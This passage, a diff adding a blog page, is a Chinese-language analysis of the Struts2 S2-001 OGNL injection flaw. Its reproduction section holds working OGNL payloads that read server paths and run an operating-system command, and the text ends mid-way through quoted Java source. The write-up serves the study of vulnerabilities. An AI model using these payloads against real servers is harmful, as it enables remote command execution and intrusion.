@@ -1,0 +1,1198 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="JavaWeb安全入门之 S2-001漏洞分析, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>JavaWeb安全入门之 S2-001漏洞分析 | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/struts2.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">JavaWeb安全入门之 S2-001漏洞分析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Java安全</span>
+                            </a>
+                        
+                            <a href="/tags/Struts2/">
+                                <span class="chip bg-color">Struts2</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
+                                Java安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-12-15
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-12-15
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.6k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>跟着大佬们的博客，开始第一篇漏洞分析记录，记录漏洞复现分析过程，已经踩到的坑，开始入坑Java Web安全，补足自己的不足。</p>
+</blockquote>
+<h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1-漏洞简介"></a>1-漏洞简介</h2><p>官方公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
+<p>漏洞影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</p>
+<h2 id="2-Struts2-架构-amp-请求处理流程"><a href="#2-Struts2-架构-amp-请求处理流程" class="headerlink" title="2-Struts2 架构&amp;请求处理流程"></a>2-Struts2 架构&amp;请求处理流程</h2><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077762148742.jpg" alt=""></p>
+<p>在该图中，一共给出了四种颜色的标识，其对应的意义如下。</p>
+<ul>
+<li>Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。</li>
+<li>Struts Core(浅蓝色)：Struts2的核心部分。</li>
+<li>Interceptors(浅绿色)：Struts2的拦截器。</li>
+<li>User created(浅黄色)：需要开发人员创建的部分。</li>
+</ul>
+<p>图中的一些组件的作用如下：</p>
+<ul>
+<li>FilterDispatcher：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。</li>
+<li>ActionMapper：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</li>
+<li>ActionProxy：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。</li>
+<li>ConfigurationManager：是xwork配置的管理中心，可以把它当做已经读取到内存中的struts.xml配置文件。</li>
+<li>struts.xml：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</li>
+<li>ActionInvocation：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</li>
+<li>Interceptor：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</li>
+<li>Action：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</li>
+<li>Result：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</li>
+<li>Templates：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</li>
+<li>Tag Subsystem：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。</li>
+</ul>
+<p>接下来我们可以结合上图，来了解下Struts2框架是如何处理一个HTTP请求的。</p>
+<p>当HTTP请求发送个Web服务器之后，Web服务器根据用户的请求以及 <code>web.xml</code> 中的配置文件，将请求转发给 <code>Struts2</code> 框架进行处理。</p>
+<ol>
+<li>HTTP请求经过一系列的过滤器，最后到达 <code>FilterDispatcher</code> 过滤器。</li>
+<li><code>FilterDispatcher</code> 将请求转发 <code>ActionMapper</code>，判断该请求是否需要处理。</li>
+<li>如果该请求需要处理，<code>FilterDispatcher</code>会创建一个 <code>ActionProxy</code> 来进行后续的处理。</li>
+<li><code>ActionProxy</code> 拿着HTTP请求，询问 <code>struts.xml</code> 该调用哪一个 <code>Action</code> 进行处理。</li>
+<li>当知道目标<code>Action</code>之后，实例化一个<code>ActionInvocation</code>来进行调用。</li>
+<li>然后运行在<code>Action</code>之前的拦截器，图中就是拦截器1、2、3。</li>
+<li>运行<code>Action</code>，生成一个<code>Result</code>。</li>
+<li><code>Result</code>根据页面模板和标签库，生成要响应的内容。</li>
+<li>根据响应逆序调用拦截器，然后生成最终的响应并返回给Web服务器。</li>
+</ol>
+<h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3-漏洞复现"></a>3-漏洞复现</h2><p>1、获取tomcat路径</p>
+<pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077772939716.jpg" alt=""></p>
+<p>2、获取web目录</p>
+<pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077773498970.jpg" alt=""></p>
+<p>3、执行命令</p>
+<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16077775507123.jpg" alt=""></p>
+<h2 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4-漏洞分析"></a>4-漏洞分析</h2><h3 id="4-1-OGNL表达式"><a href="#4-1-OGNL表达式" class="headerlink" title="4.1 OGNL表达式"></a>4.1 OGNL表达式</h3><blockquote>
+<p><a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">OGNL表达式注入漏洞总结–Mi1k7ea</a></p>
+</blockquote>
+<p>OGNL全称Object-Graph Navigation Language即对象导航图语言，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。</p>
+<p><strong>OGNL三要素</strong><br>OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。</p>
+<ul>
+<li>表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；</li>
+<li>根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；</li>
+<li>上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；</li>
+</ul>
+<h3 id="S2-001漏洞分析"><a href="#S2-001漏洞分析" class="headerlink" title="S2-001漏洞分析"></a>S2-001漏洞分析</h3><p>先在自定义的ACtion上下个断点，然后发送带payload <code>%{1+1}</code> 的请求。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079333757203.jpg" alt="-w1555"></p>
+<p>从调用栈中，我们可以看到在 <code>DefaultActionInvocation</code> 类中反射调用了我们自定义的类 <code>LoginAction</code>。<br>路径：<code>/xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code></p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079336332161.jpg" alt="-w2021"></p>
+<p>此时到达自定义类<code>LoginAction</code>的<code>username</code>的值为<code>%{1+1}</code>。</p>
+<p>根据披露的漏洞详情可以知道，导致漏洞的原因是用户提交表单数据并且验证失败时，Struts2重新渲染jsp时后端会将用户之前提交的参数值使用ognl表达式进行递归解析然后重新填充到表单中。</p>
+<p>根据最开始的struts工作流程图可以知道在一个http请求进来后，会经过一系列的 拦截器(Interceptor) ，这些拦截器可以是 Struts2 自带的，也可以是用户自定义的。例如下图 struts.xml 中的 package 继承自 struts-default ，而 struts-default 就使用了 Struts2 自带的拦截器。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079379558395.jpg" alt="-w838"></p>
+<p>在 <code>struts2-core-2.0.8.jar!/struts-default.xml</code> 中可以找到默认使用的拦截器栈 <code>defaultStack</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079380574780.jpg" alt="-w1033"></p>
+<p>在拦截器栈 <code>defaultStack</code> 中，我们需要关注 <code>params</code> 这个拦截器。其中， <code>params</code> 拦截器 会将客户端请求数据设置到 <code>值栈(valueStack)</code> 中<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079386300645.jpg" alt="-w1226"></p>
+<p>后续 <code>JSP</code> 页面中所有的动态数据都将从值栈中取出。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079605906528.jpg" alt="-w1523"></p>
+<p>这里是调试的时候进入到 <code>setParameters</code> 函数中（F7），可以喊到框中操作是把我们的输入放进了值栈<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079612927173.jpg" alt="-w1450"></p>
+<p>经过一系列的拦截器处理后，数据会成功进入实际业务 Action 。程序会根据 Action 处理的结果，选择对应的 JSP 视图进行展示，并对视图中的 Struts2 标签进行处理。<br>如下图，在本例中 Action 处理用户登录失败时会返回 error 。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079620311725.jpg" alt="-w999"></p>
+<p>根据返回结果以及先前在 <code>struts.xml</code> 中定义的视图：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>struts</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>S2-001<span class="token punctuation">"</span></span> <span class="token attr-name">extends</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>struts-default<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>action</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.lanvnal.s2001.action.LoginAction<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>success<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>welcome.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>result</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>action</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>package</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>struts</span><span class="token punctuation">></span></span></code></pre>
+<p>程序将开始处理 <code>index.jsp</code> 。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16079976797436.jpg" alt="-w850"></p>
+<p>我们的<strong>payload</strong>是从<code>index.jsp</code>输入的，这里需要了解的是<strong>jsp</strong>的本质也是一个<strong>Servlet</strong>，在执行jsp的时候<strong>tomcat</strong>会将其转化为java代码，比如这里<code>index.jsp</code>被转化为<code>index_jsp.java</code>。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080003848710.jpg" alt="-w851"></p>
+<p>当在 JSP 文件中遇到 Struts2 标签 <code>&lt;s:textfield</code> 时，程序会先调用 <code>doStartTag</code> ，并将标签中的属性设置到 <code>TextFieldTag</code> 对象相应属性中。最后，在遇到 <code>/&gt;</code> 结束标签的时候调用 <code>doEndTag</code> 方法。</p>
+<p>路径： <code>struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080001208107.jpg" alt="-w1212"></p>
+<p>路径： <code>struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ui/AbstractUITag.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080002192291.jpg" alt="-w957"></p>
+<p>在 <code>doEndTag</code> 方法中调用了 <code>this.component.end</code> 方法，而该方法调用了 <code>evaluateParams</code> 方法来填充 JSP 中的动态数据。<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080015352601.jpg" alt="-w1038"></p>
+<p>step into <code>end</code> 方法,路径：<code>struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080005812847.jpg" alt="-w977"></p>
+<p>跟进 <code>evaluateParams</code> 方法，会发现如果开启了 <code>Ognl表达式</code> 支持<code>( this.altSyntax() )</code>，程序会在属性字段两边添加 Ognl 表达式字符( <code>%{、}</code> )，然后使用 <code>findValue</code> 方法从值栈中获得该表达式所对应的值。<br>路径： <code>struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080027153004.jpg" alt=""></p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080029926494.jpg" alt=""></p>
+<p>我们来看下 findValue 方法中，具体是如何解析 Ognl 表达式。如下图，可以看到 findValue 方法先调用了 translateVariables 方法，该方法又调用了同名重载方法。问题关键，就在这个同名重载方法中。</p>
+<p>路径： <code>struts2-core-2.0.8.jar!/org/apache/struts2/components/Component.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080035233153.jpg" alt=""></p>
+<p>路径： <code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class</code><br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/All_S2_Vuls/S2_001/16080035685916.jpg" alt=""></p>
+<p><code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class:31</code></p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">translateVariables</span><span class="token punctuation">(</span><span class="token keyword">char</span> open<span class="token punctuation">,</span> String expression<span class="token punctuation">,</span> ValueStack stack<span class="token punctuation">,</span> Class <span class="token class-name">asType</span><span class="token punctuation">,</span> TextParseUtil<span class="token punctuation">.</span>ParsedValueEvaluator evaluator<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        Object result <span class="token operator">=</span> expression<span class="token punctuation">;</span>
+
+        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">int</span> start <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>open <span class="token operator">+</span> <span class="token string">"{"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> length <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> x <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">while</span><span class="token punctuation">(</span>start <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> x <span class="token operator">&lt;</span> length <span class="token operator">&amp;&amp;</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">char</span> c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'{'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token operator">++</span>count<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'}'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token operator">--</span>count<span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+            <span class="token keyword">int</span> end <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
